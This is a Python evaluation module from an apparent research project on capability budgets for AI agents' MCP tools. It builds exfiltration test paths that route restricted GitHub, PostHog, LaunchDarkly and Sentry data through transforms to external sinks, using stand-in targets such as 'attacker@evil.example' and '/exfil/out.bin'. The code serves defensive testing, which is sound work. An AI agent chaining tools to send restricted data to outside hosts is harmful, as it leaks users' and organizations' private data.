"""
Real tool catalogs with measured (model-authored) manifests.

The catalog is 114 real tools from four open-source MCP servers (GitHub,
PostHog, LaunchDarkly, Sentry; data/real_tools_spec.json). Its gold labels are
the expert-written OpenAPPA battery rules: 93 tools return data restricted to
the requester or the organization. A deployment connects one or more of these
services plus an agent's generic tools: two transforms and three external
sinks (HTTP request, email, file write).

Each author's answers (results/real_tools.json) become that author's
manifests. Every expert-restricted tool is instantiated as a source, whatever
role the author named, and its budget is the authored channel set:

    display_only   -> DISPLAY
    internal_email -> SEND_EMAIL(@corp.example)      internal recipients only
    file_tmp       -> WRITE_FILE(/tmp/*)
    any_network    -> SEND_HTTP(*)

So only an authored any_network can open an exfiltration path, and a role the
author got wrong is not counted as a hole: the measured vulnerability is a
lower bound. The test is source-complete with all-sink coverage: every
restricted source is sent, through zero to two transforms, to each external
sink (an attacker URL, an outside email address, and a path outside /tmp).
"""
from __future__ import annotations

import json
import random
from pathlib import Path
from typing import Dict, List, Tuple

from chaincaps.core.budget import Budget, SinkPrivilege, SinkType
from chaincaps.core.manifest import ToolManifest

from scaling.catalog import Role, ToolSpec, gold_manifest
from scaling.workflows import ATTACKER_URL, _run_chain

ROOT = Path(__file__).resolve().parent.parent
SPEC = ROOT / "data" / "real_tools_spec.json"
SERVICES = ["github", "posthog", "launchdarkly", "sentry"]
EXTERNAL = {"agent__ext_sink_http": (Role.HTTP_SINK, "url", ATTACKER_URL),
            "agent__ext_sink_email": (Role.EMAIL_SINK, "to", "attacker@evil.example"),
            "agent__ext_sink_file": (Role.FILE_SINK, "path", "/exfil/out.bin")}
TRANSFORMS = ["agent__summarize", "agent__json_transform"]
CHANNEL_PRIV = {"display_only": SinkPrivilege(SinkType.DISPLAY),
                "internal_email": SinkPrivilege(SinkType.SEND_EMAIL, "@corp.example"),
                "file_tmp": SinkPrivilege(SinkType.WRITE_FILE, "/tmp/*"),
                "any_network": SinkPrivilege(SinkType.SEND_HTTP, "*")}


def load_spec() -> List[dict]:
    return json.loads(SPEC.read_text())["tools"]


def tool_id(t: dict) -> str:
    return f"{t['service']}__{t['name'].replace('-', '_')}"


def catalog(services: List[str]) -> Tuple[List[ToolSpec], List[dict]]:
    """Real tools of the given services plus the agent's generic tools."""
    real = [t for t in load_spec() if t["service"] in services]
    specs = [ToolSpec(tool_id(t), Role.SENSITIVE_SOURCE if t["restricted"] else Role.PUBLIC_SOURCE)
             for t in real]
    specs += [ToolSpec(n, Role.TRANSFORM) for n in TRANSFORMS]
    specs += [ToolSpec(n, role) for n, (role, _, _) in EXTERNAL.items()]
    return specs, real


def authored_budget(channels: List[str]) -> Budget:
    privs = [CHANNEL_PRIV[c] for c in channels if c in CHANNEL_PRIV]
    return Budget.from_sinks(*privs) if privs else Budget.from_sinks()


def manifests_for(specs: List[ToolSpec], answers: Dict[str, List[str]]) -> Dict[str, ToolManifest]:
    """answers: tool id -> authored channel list, for the restricted tools."""
    out = {}
    for s in specs:
        if s.role is Role.SENSITIVE_SOURCE:
            out[s.name] = ToolManifest(name=s.name, is_source=True,
                                       default_source_budget=authored_budget(answers.get(s.name, [])))
        else:
            out[s.name] = gold_manifest(s)
    return out


def attack_paths(specs: List[ToolSpec], seed: int = 0) -> List[Tuple[str, List[str], str, str, str]]:
    """(source, transforms, sink, param, value): every restricted source to every external sink."""
    rng = random.Random(seed)
    paths = []
    for s in specs:
        if s.role is not Role.SENSITIVE_SOURCE:
            continue
        for sink, (_, param, value) in EXTERNAL.items():
            k = rng.randint(0, 2)
            paths.append((s.name, rng.sample(TRANSFORMS, k), sink, param, value))
    return paths


def evaluate_chaincaps(manifests, paths) -> Dict[int, bool]:
    return {i: _run_chain(manifests, src, chain, sink, {param: value})
            for i, (src, chain, sink, param, value) in enumerate(paths)}


def evaluate_appa(specs, manifests, paths) -> Dict[int, bool]:
    from scaling.appa_engine import policy_toml, replay, source_label, trace
    labels = {s.name: source_label(manifests[s.name]) for s in specs if s.role is Role.SENSITIVE_SOURCE}
    traces = {f"attack_{i:04d}": trace(src, chain, sink, param, value)
              for i, (src, chain, sink, param, value) in enumerate(paths)}
    got = replay(policy_toml(specs, labels), traces)
    return {i: got[f"attack_{i:04d}"] for i in range(len(paths))}
